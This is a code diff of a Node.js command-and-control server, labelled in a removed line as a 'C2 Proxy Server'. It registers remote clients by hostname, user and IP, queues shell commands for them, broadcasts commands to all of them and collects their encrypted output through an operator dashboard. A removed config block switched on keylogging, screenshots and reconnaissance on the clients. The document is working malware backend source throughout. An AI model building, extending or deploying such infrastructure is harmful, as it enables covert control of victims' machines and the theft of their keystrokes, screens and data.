@@ -1,13 +1,12 @@
-// index.js - Advanced Render.com C2 Proxy Server with Force Login
 import express from 'express';
 import crypto from 'crypto';
 import cors from 'cors';
 import compression from 'compression';
 import helmet from 'helmet';
 import rateLimit from 'express-rate-limit';
+import session from 'express-session';  
 import { WebSocketServer } from 'ws';
 import http from 'http';
-import session from 'express-session';
 
 // ==================== CONFIGURATION ====================
 const PORT = process.env.PORT || 8080;
@@ -63,14 +62,14 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocketServer({ server });
 
-// Session middleware
+// ✅ Session middleware (FIXED - express-session is now installed)
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
     cookie: {
-        secure: false, // Set to true if using HTTPS
-        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+        secure: false,
+        maxAge: 24 * 60 * 60 * 1000
     }
 }));
 
@@ -180,17 +179,15 @@ function isAuthenticated(req, res, next) {
     if (req.session && req.session.isAuthenticated) {
         return next();
     }
-    // If API request, return 401
     if (req.path.startsWith('/api/')) {
         return res.status(401).json({ error: 'Unauthorized - Please login first' });
     }
-    // Redirect to login page
     res.redirect('/login');
 }
 
-// Login page
+// ==================== LOGIN PAGE ====================
+
 app.get('/login', (req, res) => {
-    // If already authenticated, redirect to dashboard
     if (req.session && req.session.isAuthenticated) {
         return res.redirect('/dashboard');
     }
@@ -220,34 +217,12 @@ app.get('/login', (req, res) => {
             border: 1px solid #1e2d3d;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
         }
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .login-header .logo {
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-        .login-header h1 {
-            color: #00ff88;
-            font-size: 24px;
-            font-weight: 600;
-        }
-        .login-header p {
-            color: #8899aa;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        .form-group label {
-            display: block;
-            color: #e0e0e0;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 5px;
-        }
+        .login-header { text-align: center; margin-bottom: 30px; }
+        .login-header .logo { font-size: 48px; margin-bottom: 10px; }
+        .login-header h1 { color: #00ff88; font-size: 24px; font-weight: 600; }
+        .login-header p { color: #8899aa; font-size: 14px; margin-top: 5px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; color: #e0e0e0; font-size: 14px; font-weight: 500; margin-bottom: 5px; }
         .form-group input {
             width: 100%;
             padding: 12px 15px;
@@ -263,9 +238,6 @@ app.get('/login', (req, res) => {
             border-color: #00ff88;
             box-shadow: 0 0 0 3px rgba(0, 255, 136, 0.1);
         }
-        .form-group input::placeholder {
-            color: #4a5a6a;
-        }
         .login-btn {
             width: 100%;
             padding: 12px;
@@ -278,18 +250,7 @@ app.get('/login', (req, res) => {
             cursor: pointer;
             transition: all 0.3s;
         }
-        .login-btn:hover {
-            background: #00cc66;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.2);
-        }
-        .login-btn:active {
-            transform: translateY(0);
-        }
-        .login-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
+        .login-btn:hover { background: #00cc66; transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0, 255, 136, 0.2); }
         .error-message {
             background: #ff444422;
             color: #ff4444;
@@ -310,16 +271,6 @@ app.get('/login', (req, res) => {
             display: none;
             border-left: 3px solid #00ff88;
         }
-        .login-footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #4a5a6a;
-            font-size: 12px;
-        }
-        .login-footer a {
-            color: #00ff88;
-            text-decoration: none;
-        }
         .status-indicator {
             display: flex;
             align-items: center;
@@ -330,33 +281,12 @@ app.get('/login', (req, res) => {
             background: #0a0e17;
             border-radius: 8px;
         }
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #00ff88;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        .status-text {
-            color: #8899aa;
-            font-size: 12px;
-        }
-        .shaking {
-            animation: shake 0.5s ease-in-out;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-        @media (max-width: 480px) {
-            .login-container { padding: 30px 20px; }
-        }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .status-text { color: #8899aa; font-size: 12px; }
+        .shaking { animation: shake 0.5s ease-in-out; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
+        @media (max-width: 480px) { .login-container { padding: 30px 20px; } }
     </style>
 </head>
 <body>
@@ -373,55 +303,22 @@ app.get('/login', (req, res) => {
         <form id="loginForm" onsubmit="handleLogin(event)">
             <div class="form-group">
                 <label for="username">Username</label>
-                <input 
-                    type="text" 
-                    id="username" 
-                    placeholder="Enter your username" 
-                    value="${ADMIN_USERNAME}"
-                    required
-                    autocomplete="username"
-                >
+                <input type="text" id="username" placeholder="Enter your username" value="admin" required>
             </div>
             <div class="form-group">
                 <label for="password">Password</label>
-                <input 
-                    type="password" 
-                    id="password" 
-                    placeholder="Enter your password"
-                    required
-                    autocomplete="current-password"
-                >
+                <input type="password" id="password" placeholder="Enter your password" required>
             </div>
-            <button type="submit" class="login-btn" id="loginBtn">
-                🔐 Login
-            </button>
+            <button type="submit" class="login-btn" id="loginBtn">🔐 Login</button>
         </form>
 
         <div class="status-indicator">
             <span class="status-dot"></span>
             <span class="status-text">System Online • v3.0.0</span>
         </div>
-
-        <div class="login-footer">
-            <p>Unauthorized access is prohibited</p>
-            <p style="margin-top: 5px;">🔒 All communications are encrypted</p>
-        </div>
     </div>
 
     <script>
-        // Check if already logged in
-        (async function() {
-            try {
-                const response = await fetch('/api/admin/check-auth');
-                const data = await response.json();
-                if (data.authenticated) {
-                    window.location.href = '/dashboard';
-                }
-            } catch (e) {
-                // Not logged in, stay on login page
-            }
-        })();
-
         async function handleLogin(event) {
             event.preventDefault();
             
@@ -431,46 +328,32 @@ app.get('/login', (req, res) => {
             const errorMessage = document.getElementById('errorMessage');
             const successMessage = document.getElementById('successMessage');
             
-            // Reset messages
             errorMessage.style.display = 'none';
             successMessage.style.display = 'none';
             document.querySelector('.login-container').classList.remove('shaking');
             
-            // Disable button
             loginBtn.disabled = true;
             loginBtn.textContent = '⏳ Logging in...';
             
             try {
                 const response = await fetch('/api/admin/login', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 });
                 
                 const data = await response.json();
                 
                 if (response.ok && data.status === 'success') {
-                    // Success
                     successMessage.textContent = '✅ Login successful! Redirecting...';
                     successMessage.style.display = 'block';
-                    
-                    // Redirect to dashboard
-                    setTimeout(() => {
-                        window.location.href = '/dashboard';
-                    }, 1000);
+                    setTimeout(() => { window.location.href = '/dashboard'; }, 1000);
                 } else {
-                    // Error
                     errorMessage.textContent = '❌ ' + (data.error || 'Invalid credentials');
                     errorMessage.style.display = 'block';
                     document.querySelector('.login-container').classList.add('shaking');
-                    
-                    // Reset button
                     loginBtn.disabled = false;
                     loginBtn.textContent = '🔐 Login';
-                    
-                    // Clear password
                     document.getElementById('password').value = '';
                     document.getElementById('password').focus();
                 }
@@ -482,20 +365,12 @@ app.get('/login', (req, res) => {
             }
         }
 
-        // Enter key support
         document.getElementById('password').addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
                 document.getElementById('loginForm').dispatchEvent(new Event('submit'));
             }
         });
 
-        document.getElementById('username').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('password').focus();
-            }
-        });
-
-        // Auto-focus username
         document.getElementById('username').focus();
     </script>
 </body>
@@ -505,7 +380,6 @@ app.get('/login', (req, res) => {
 
 // ==================== AUTHENTICATION CHECK ====================
 
-// Check if user is authenticated
 app.get('/api/admin/check-auth', (req, res) => {
     if (req.session && req.session.isAuthenticated) {
         res.json({ authenticated: true, username: req.session.username });
@@ -514,24 +388,20 @@ app.get('/api/admin/check-auth', (req, res) => {
     }
 });
 
-// Logout
 app.get('/logout', (req, res) => {
     req.session.destroy();
     res.redirect('/login');
 });
 
-// Login API
 app.post('/api/admin/login', async (req, res) => {
     try {
         const { username, password } = req.body;
         
         if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-            // Set session
             req.session.isAuthenticated = true;
             req.session.username = username;
             req.session.loginTime = new Date().toISOString();
             
-            // Generate token for API access
             const token = await generateAdminToken();
             req.session.token = token;
             
@@ -551,19 +421,16 @@ app.post('/api/admin/login', async (req, res) => {
     }
 });
 
-// Logout API
 app.post('/api/admin/logout', (req, res) => {
     req.session.destroy();
     res.json({ status: 'success', message: 'Logged out' });
 });
 
 async function authenticate(req, res, next) {
-    // Check session first
     if (req.session && req.session.isAuthenticated) {
         return next();
     }
     
-    // Check Bearer token
     const authHeader = req.headers.authorization;
     if (authHeader && authHeader.startsWith('Bearer ')) {
         const token = authHeader.substring(7);
@@ -619,7 +486,6 @@ class ClientManager {
         }
         
         console.log(`✅ Client registered: ${clientId} (${hostname}/${username})`);
-        
         return clientData;
     }
 
@@ -630,7 +496,6 @@ class ClientManager {
         client.lastSeen = new Date().toISOString();
         client.status = 'online';
         await this.store.set(`client:${clientId}`, client);
-        
         this.clients.set(clientId, client);
         return client;
     }
@@ -642,29 +507,18 @@ class ClientManager {
 
     async getStats() {
         const clients = await this.store.get('clients') || [];
-        const stats = {
-            total: clients.length,
-            online: 0,
-            offline: 0,
-            lastHour: 0
-        };
+        const stats = { total: clients.length, online: 0, offline: 0, lastHour: 0 };
         
         const now = Date.now();
         for (const id of clients) {
             const client = await this.store.get(`client:${id}`);
             if (client) {
                 const lastSeen = new Date(client.lastSeen).getTime();
-                if (now - lastSeen < this.onlineThreshold) {
-                    stats.online++;
-                } else {
-                    stats.offline++;
-                }
-                if (now - lastSeen < 3600000) {
-                    stats.lastHour++;
-                }
+                if (now - lastSeen < this.onlineThreshold) stats.online++;
+                else stats.offline++;
+                if (now - lastSeen < 3600000) stats.lastHour++;
             }
         }
-        
         return stats;
     }
 }
@@ -696,7 +550,6 @@ class AnalyticsEngine {
             await this.store.delete(old);
         }
         await this.store.set('events', events);
-        
         this.events.push(event);
         return event;
     }
@@ -732,18 +585,12 @@ class AnalyticsEngine {
                 metrics.commandExecutions++;
                 const cmd = event.data.command || 'unknown';
                 metrics.commands[cmd] = (metrics.commands[cmd] || 0) + 1;
-                
                 const hour = eventTime.getHours();
                 metrics.timeline[hour] = (metrics.timeline[hour] || 0) + 1;
             }
             
-            if (event.data.clientId) {
-                clients.add(event.data.clientId);
-            }
-            
-            if (event.type === 'error') {
-                metrics.errors++;
-            }
+            if (event.data.clientId) clients.add(event.data.clientId);
+            if (event.type === 'error') metrics.errors++;
         }
         
         metrics.uniqueClients = clients.size;
@@ -753,7 +600,7 @@ class AnalyticsEngine {
 
 const analytics = new AnalyticsEngine(store);
 
-// ==================== PROTECTED API ENDPOINTS ====================
+// ==================== API ENDPOINTS ====================
 
 // Health Check (public)
 app.get('/health', (req, res) => {
@@ -779,22 +626,12 @@ app.get('/', (req, res) => {
 
 // ==================== PROTECTED API ENDPOINTS ====================
 
-// Client API (protected)
 app.post('/api/register', authenticate, async (req, res) => {
     try {
         const { clientId, hostname, username, ip } = req.body;
+        if (!clientId) return res.status(400).json({ error: 'clientId required' });
         
-        if (!clientId) {
-            return res.status(400).json({ error: 'clientId required' });
-        }
-        
-        const clientData = await clientManager.register({
-            clientId,
-            hostname,
-            username,
-            ip
-        });
-        
+        const clientData = await clientManager.register({ clientId, hostname, username, ip });
         const commands = await clientManager.getPendingCommands(clientId);
         await store.delete(`pending:${clientId}`);
         
@@ -802,13 +639,7 @@ app.post('/api/register', authenticate, async (req, res) => {
             status: 'registered',
             clientId,
             commands,
-            config: {
-                pollingInterval: 2000,
-                heartbeatInterval: 300000,
-                keyloggerEnabled: true,
-                screenshotEnabled: true,
-                reconEnabled: true
-            }
+            config: { pollingInterval: 2000, heartbeatInterval: 300000 }
         });
         
         await analytics.log('client_registered', { clientId, hostname, username, ip });
@@ -822,29 +653,17 @@ app.post('/api/register', authenticate, async (req, res) => {
 app.post('/api/poll', authenticate, async (req, res) => {
     try {
         const { clientId, encryptedData } = req.body;
-        
-        if (!clientId) {
-            return res.status(400).json({ error: 'clientId required' });
-        }
+        if (!clientId) return res.status(400).json({ error: 'clientId required' });
         
         let data;
-        try {
-            data = cryptoManager.decrypt(encryptedData);
-        } catch (e) {
-            data = req.body;
-        }
+        try { data = cryptoManager.decrypt(encryptedData); } catch (e) { data = req.body; }
         
         await clientManager.heartbeat(clientId);
         const commands = await clientManager.getPendingCommands(clientId);
         await store.delete(`pending:${clientId}`);
         await analytics.log('poll', { clientId, commandCount: commands.length });
         
-        const response = cryptoManager.encrypt({
-            status: 'success',
-            commands
-        });
-        
-        res.json(response);
+        res.json(cryptoManager.encrypt({ status: 'success', commands }));
     } catch (err) {
         console.error('Poll error:', err);
         res.status(500).json({ error: err.message });
@@ -854,20 +673,12 @@ app.post('/api/poll', authenticate, async (req, res) => {
 app.post('/api/results', authenticate, async (req, res) => {
     try {
         const { clientId, encryptedData } = req.body;
-        
-        if (!clientId) {
-            return res.status(400).json({ error: 'clientId required' });
-        }
+        if (!clientId) return res.status(400).json({ error: 'clientId required' });
         
         let data;
-        try {
-            data = cryptoManager.decrypt(encryptedData);
-        } catch (e) {
-            data = req.body;
-        }
+        try { data = cryptoManager.decrypt(encryptedData); } catch (e) { data = req.body; }
         
         const { commandId, output, status, duration, error } = data;
-        
         const resultKey = `result:${clientId}:${commandId || Date.now()}`;
         const resultData = {
             clientId,
@@ -889,19 +700,8 @@ app.post('/api/results', authenticate, async (req, res) => {
         }
         await store.set(`results:${clientId}`, results);
         
-        await analytics.log('command_result', { 
-            clientId, 
-            commandId, 
-            status,
-            outputLength: output ? output.length : 0
-        });
-        
-        const response = cryptoManager.encrypt({
-            status: 'success',
-            message: 'Results stored'
-        });
-        
-        res.json(response);
+        await analytics.log('command_result', { clientId, commandId, status });
+        res.json(cryptoManager.encrypt({ status: 'success', message: 'Results stored' }));
     } catch (err) {
         console.error('Results error:', err);
         res.status(500).json({ error: err.message });
@@ -911,14 +711,10 @@ app.post('/api/results', authenticate, async (req, res) => {
 app.post('/api/heartbeat', authenticate, async (req, res) => {
     try {
         const { clientId } = req.body;
-        
-        if (!clientId) {
-            return res.status(400).json({ error: 'clientId required' });
-        }
+        if (!clientId) return res.status(400).json({ error: 'clientId required' });
         
         await clientManager.heartbeat(clientId);
         await analytics.log('heartbeat', { clientId });
-        
         res.json({ status: 'success' });
     } catch (err) {
         console.error('Heartbeat error:', err);
@@ -926,13 +722,12 @@ app.post('/api/heartbeat', authenticate, async (req, res) => {
     }
 });
 
-// ==================== ADMIN API (Protected) ====================
+// ==================== ADMIN API ====================
 
 app.get('/api/admin/clients', authenticate, async (req, res) => {
     try {
         const clients = await store.get('clients') || [];
         const clientData = [];
-        
         for (const id of clients) {
             const data = await store.get(`client:${id}`);
             if (data) {
@@ -943,7 +738,6 @@ app.get('/api/admin/clients', authenticate, async (req, res) => {
                 clientData.push(data);
             }
         }
-        
         clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
         res.json({ clients: clientData });
     } catch (err) {
@@ -955,9 +749,7 @@ app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
     try {
         const { clientId } = req.params;
         const client = await store.get(`client:${clientId}`);
-        if (!client) {
-            return res.status(404).json({ error: 'Client not found' });
-        }
+        if (!client) return res.status(404).json({ error: 'Client not found' });
         
         const pending = await store.get(`pending:${clientId}`) || [];
         const results = await store.get(`results:${clientId}`) || [];
@@ -966,17 +758,10 @@ app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
         const fullResults = [];
         for (const key of results.slice(-20)) {
             const result = await store.get(key);
-            if (result) {
-                fullResults.push(result);
-            }
+            if (result) fullResults.push(result);
         }
         
-        res.json({
-            client,
-            pending: pending.length,
-            results: fullResults,
-            history: history.slice(-20)
-        });
+        res.json({ client, pending: pending.length, results: fullResults, history: history.slice(-20) });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -985,7 +770,6 @@ app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
 app.post('/api/admin/command', authenticate, async (req, res) => {
     try {
         const { clientId, command, scheduled } = req.body;
-        
         if (!clientId || !command) {
             return res.status(400).json({ error: 'clientId and command required' });
         }
@@ -999,33 +783,19 @@ app.post('/api/admin/command', authenticate, async (req, res) => {
             scheduled: scheduled || null
         };
         
-        if (scheduled) {
-            commandEntry.scheduledTime = new Date(scheduled).toISOString();
-        }
+        if (scheduled) commandEntry.scheduledTime = new Date(scheduled).toISOString();
         
         const pendingCommands = await store.get(`pending:${clientId}`) || [];
         pendingCommands.push(commandEntry);
         await store.set(`pending:${clientId}`, pendingCommands);
         
         const history = await store.get(`history:${clientId}`) || [];
-        history.push({
-            id: commandId,
-            command,
-            timestamp: new Date().toISOString(),
-            status: 'sent'
-        });
-        if (history.length > 100) {
-            history.shift();
-        }
+        history.push({ id: commandId, command, timestamp: new Date().toISOString(), status: 'sent' });
+        if (history.length > 100) history.shift();
         await store.set(`history:${clientId}`, history);
         
         await analytics.log('command_sent', { clientId, commandId, command });
-        
-        res.json({ 
-            status: 'success', 
-            commandId,
-            scheduled: scheduled || false
-        });
+        res.json({ status: 'success', commandId, scheduled: scheduled || false });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -1034,9 +804,7 @@ app.post('/api/admin/command', authenticate, async (req, res) => {
 app.post('/api/admin/broadcast', authenticate, async (req, res) => {
     try {
         const { command } = req.body;
-        if (!command) {
-            return res.status(400).json({ error: 'command required' });
-        }
+        if (!command) return res.status(400).json({ error: 'command required' });
         
         const clients = await store.get('clients') || [];
         const results = [];
@@ -1053,17 +821,11 @@ app.post('/api/admin/broadcast', authenticate, async (req, res) => {
             const pendingCommands = await store.get(`pending:${clientId}`) || [];
             pendingCommands.push(commandEntry);
             await store.set(`pending:${clientId}`, pendingCommands);
-            
             results.push({ clientId, commandId });
         }
         
         await analytics.log('broadcast', { command, clientCount: clients.length });
-        
-        res.json({
-            status: 'success',
-            broadcasted: results.length,
-            clients: results
-        });
+        res.json({ status: 'success', broadcasted: results.length, clients: results });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -1082,15 +844,10 @@ app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
         
         for (let i = start; i < end && i >= 0; i++) {
             const data = await store.get(resultKeys[i]);
-            if (data) {
-                results.push(data);
-            }
+            if (data) results.push(data);
         }
         
-        res.json({ 
-            results: results.reverse(),
-            total: resultKeys.length
-        });
+        res.json({ results: results.reverse(), total: resultKeys.length });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -1099,7 +856,6 @@ app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
 app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
     try {
         const { clientId } = req.params;
-        
         const clients = await store.get('clients') || [];
         const index = clients.indexOf(clientId);
         if (index > -1) {
@@ -1113,7 +869,6 @@ app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
         await store.delete(`results:${clientId}`);
         
         await analytics.log('client_deleted', { clientId });
-        
         res.json({ status: 'success', message: 'Client deleted' });
     } catch (err) {
         res.status(500).json({ error: err.message });
@@ -1125,18 +880,13 @@ app.get('/api/admin/analytics', authenticate, async (req, res) => {
         const { range = '24h' } = req.query;
         const metrics = await analytics.getMetrics(range);
         const stats = await clientManager.getStats();
-        
-        res.json({
-            stats,
-            metrics,
-            timestamp: new Date().toISOString()
-        });
+        res.json({ stats, metrics, timestamp: new Date().toISOString() });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
 });
 
-// ==================== DASHBOARD (Protected) ====================
+// ==================== DASHBOARD ====================
 
 app.get('/dashboard', isAuthenticated, (req, res) => {
     res.send(`
@@ -1240,9 +990,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
     const API_BASE = window.location.origin;
     
     function getHeaders() {
-        return {
-            'Content-Type': 'application/json'
-        };
+        return { 'Content-Type': 'application/json' };
     }
     
     function refreshAll() {
@@ -1253,16 +1001,9 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
     
     function logout() {
         if (confirm('Are you sure you want to logout?')) {
-            fetch(API_BASE + '/api/admin/logout', {
-                method: 'POST',
-                headers: getHeaders()
-            })
-            .then(() => {
-                window.location.href = '/login';
-            })
-            .catch(() => {
-                window.location.href = '/login';
-            });
+            fetch(API_BASE + '/api/admin/logout', { method: 'POST', headers: getHeaders() })
+                .then(() => { window.location.href = '/login'; })
+                .catch(() => { window.location.href = '/login'; });
         }
     }
     
@@ -1274,7 +1015,6 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
                     <span class="success">✅ Online</span>
                     | Clients: <strong>\${data.clients || 0}</strong>
                     | Uptime: <strong>\${Math.floor(data.uptime / 60)}m</strong>
-                    | Version: <strong>\${data.version || '3.0.0'}</strong>
                 \`;
             })
             .catch(err => {
@@ -1288,10 +1028,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
         
         fetch(API_BASE + '/api/admin/clients', { headers: getHeaders() })
             .then(res => {
-                if (res.status === 401) {
-                    window.location.href = '/login';
-                    return;
-                }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 return res.json();
             })
             .then(data => {
@@ -1300,12 +1037,10 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
                     listEl.innerHTML = '<span class="error">❌ ' + data.error + '</span>';
                     return;
                 }
-                
                 if (!data.clients || data.clients.length === 0) {
                     listEl.innerHTML = 'No clients connected yet.';
                     return;
                 }
-                
                 listEl.innerHTML = '';
                 data.clients.forEach(client => {
                     const card = document.createElement('div');
@@ -1336,10 +1071,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
     function loadAnalytics() {
         fetch(API_BASE + '/api/admin/analytics', { headers: getHeaders() })
             .then(res => {
-                if (res.status === 401) {
-                    window.location.href = '/login';
-                    return;
-                }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 return res.json();
             })
             .then(data => {
@@ -1361,21 +1093,13 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
         const command = document.getElementById('commandInput').value.trim();
         const scheduleTime = document.getElementById('scheduleTime').value;
         
-        if (!command) {
-            alert('Please enter a command');
-            return;
-        }
-        if (!clientId) {
-            alert('Please enter a Client ID');
-            return;
-        }
+        if (!command) { alert('Please enter a command'); return; }
+        if (!clientId) { alert('Please enter a Client ID'); return; }
         
         document.getElementById('commandStatus').innerHTML = '⏳ Sending command...';
         
         const payload = { clientId, command };
-        if (scheduleTime) {
-            payload.scheduled = scheduleTime;
-        }
+        if (scheduleTime) payload.scheduled = scheduleTime;
         
         fetch(API_BASE + '/api/admin/command', {
             method: 'POST',
@@ -1383,10 +1107,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
             body: JSON.stringify(payload)
         })
         .then(res => {
-            if (res.status === 401) {
-                window.location.href = '/login';
-                return;
-            }
+            if (res.status === 401) { window.location.href = '/login'; return; }
             return res.json();
         })
         .then(data => {
@@ -1406,11 +1127,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
     
     function broadcastCommand() {
         const command = document.getElementById('commandInput').value.trim();
-        if (!command) {
-            alert('Please enter a command');
-            return;
-        }
-        
+        if (!command) { alert('Please enter a command'); return; }
         if (!confirm('Send this command to ALL connected clients?')) return;
         
         document.getElementById('commandStatus').innerHTML = '⏳ Broadcasting...';
@@ -1421,10 +1138,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
             body: JSON.stringify({ command })
         })
         .then(res => {
-            if (res.status === 401) {
-                window.location.href = '/login';
-                return;
-            }
+            if (res.status === 401) { window.location.href = '/login'; return; }
             return res.json();
         })
         .then(data => {
@@ -1446,10 +1160,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
         
         fetch(API_BASE + '/api/admin/results/' + clientId, { headers: getHeaders() })
             .then(res => {
-                if (res.status === 401) {
-                    window.location.href = '/login';
-                    return;
-                }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 return res.json();
             })
             .then(data => {
@@ -1476,12 +1187,7 @@ app.get('/dashboard', isAuthenticated, (req, res) => {
     }
     
     // Auto-refresh
-    setInterval(() => {
-        loadClients();
-        loadAnalytics();
-    }, 30000);
-    
-    console.log('🚀 Dashboard loaded');
+    setInterval(() => { loadClients(); loadAnalytics(); }, 30000);
     refreshAll();
 </script>
 </body>
@@ -1513,22 +1219,7 @@ wss.on('connection', (ws, req) => {
             if (data.type === 'subscribe') {
                 const { clientId } = data;
                 wsClients.set(ws, { clientId, subscribed: true });
-                ws.send(JSON.stringify({ 
-                    type: 'subscribed', 
-                    clientId,
-                    message: `Subscribed to ${clientId}`
-                }));
-                
-                const client = await store.get(`client:${clientId}`);
-                const results = await store.get(`results:${clientId}`) || [];
-                const pending = await store.get(`pending:${clientId}`) || [];
-                
-                ws.send(JSON.stringify({
-                    type: 'initial_data',
-                    client,
-                    results: results.slice(-10),
-                    pending
-                }));
+                ws.send(JSON.stringify({ type: 'subscribed', clientId }));
             }
         } catch (err) {
             console.error('WebSocket error:', err);
@@ -1567,7 +1258,6 @@ setInterval(async () => {
             task.status = 'executed';
             task.executedAt = new Date().toISOString();
             await store.set(`task:${taskId}`, task);
-            
             console.log(`✅ Scheduled task ${taskId} executed`);
         }
     }
